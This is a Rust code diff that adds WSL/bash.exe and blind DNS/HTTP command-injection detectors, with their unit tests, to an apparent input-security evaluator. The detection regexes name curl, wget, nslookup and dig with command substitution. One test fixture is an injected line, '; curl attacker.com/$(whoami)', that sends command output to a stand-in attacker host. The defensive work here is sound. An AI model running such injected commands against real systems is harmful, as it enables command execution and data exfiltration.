@@ -1416,6 +1416,57 @@ impl CmdInjectionEvaluator {
             });
         }
     }
+
+    fn detect_wsl_bypass(&self, raw_input: &str, dets: &mut Vec<L2Detection>) {
+        static WSL_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)\b(?:bash(?:\.exe)?\s+-c|wsl(?:(?:\.exe)?\s+--exec|\s+-e))\b").unwrap()
+        });
+
+        for m in WSL_RE.find_iter(raw_input) {
+            let matched = m.as_str().to_lowercase();
+            let confidence = if matched.contains("bash.exe") {
+                0.91
+            } else {
+                0.90
+            };
+            dets.push(L2Detection {
+                detection_type: "wsl_bash_bypass".into(),
+                confidence,
+                detail: "WSL or bash.exe execution primitive detected".into(),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "Input invokes Windows Subsystem for Linux or bash.exe for command execution".into(),
+                    offset: m.start(),
+                    property: "User input must not bypass execution restrictions via WSL or bash".into(),
+                }],
+            });
+        }
+    }
+
+    fn detect_blind_cmdi_dns(&self, raw_input: &str, dets: &mut Vec<L2Detection>) {
+        static BLIND_DNS_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)\b(?:nslookup|dig|curl|wget)\b[^\n]{0,100}(?:\$\([^)]+\)|`[^`]+`)")
+                .unwrap()
+        });
+
+        for m in BLIND_DNS_RE.find_iter(raw_input) {
+            dets.push(L2Detection {
+                detection_type: "blind_cmdi_dns".into(),
+                confidence: 0.88,
+                detail: "Blind command injection via DNS or HTTP callback detected".into(),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "Input uses out-of-band network request with command substitution for data exfiltration".into(),
+                    offset: m.start(),
+                    property: "User input must not execute blind command injection callbacks".into(),
+                }],
+            });
+        }
+    }
 }
 
 impl L2Evaluator for CmdInjectionEvaluator {
@@ -1462,6 +1513,8 @@ impl L2Evaluator for CmdInjectionEvaluator {
         self.detect_bash_advanced_bypasses(&decoded, &mut dets);
         self.detect_container_escape_patterns(&decoded, &mut dets);
         self.detect_cloud_shell_patterns(&decoded, &mut dets);
+        self.detect_wsl_bypass(&decoded, &mut dets);
+        self.detect_blind_cmdi_dns(&decoded, &mut dets);
 
         // Sensitive file boost
         for file in SENSITIVE_FILES {
@@ -1525,7 +1578,9 @@ impl L2Evaluator for CmdInjectionEvaluator {
             | "container_chroot_breakout"
             | "cloud_aws_ssm_command"
             | "cloud_gcp_cloud_shell"
-            | "cloud_azure_cloud_shell" => Some(InvariantClass::CmdArgumentInjection),
+            | "cloud_azure_cloud_shell"
+            | "wsl_bash_bypass"
+            | "blind_cmdi_dns" => Some(InvariantClass::CmdArgumentInjection),
             _ => None,
         }
     }
@@ -2209,5 +2264,33 @@ mod tests {
                 .iter()
                 .any(|d| d.detection_type == "cloud_azure_cloud_shell")
         );
+    }
+
+    #[test]
+    fn detect_wsl_bash_bypass_positive() {
+        let eval = CmdInjectionEvaluator;
+        let dets = eval.detect("bash.exe -c 'id'");
+        assert!(dets.iter().any(|d| d.detection_type == "wsl_bash_bypass"));
+    }
+
+    #[test]
+    fn detect_wsl_bash_bypass_negative() {
+        let eval = CmdInjectionEvaluator;
+        let dets = eval.detect("echo 'bash.exe is cool'");
+        assert!(!dets.iter().any(|d| d.detection_type == "wsl_bash_bypass"));
+    }
+
+    #[test]
+    fn detect_blind_cmdi_dns_positive() {
+        let eval = CmdInjectionEvaluator;
+        let dets = eval.detect("; curl attacker.com/$(whoami)");
+        assert!(dets.iter().any(|d| d.detection_type == "blind_cmdi_dns"));
+    }
+
+    #[test]
+    fn detect_blind_cmdi_dns_negative() {
+        let eval = CmdInjectionEvaluator;
+        let dets = eval.detect("curl http://example.com");
+        assert!(!dets.iter().any(|d| d.detection_type == "blind_cmdi_dns"));
     }
 }
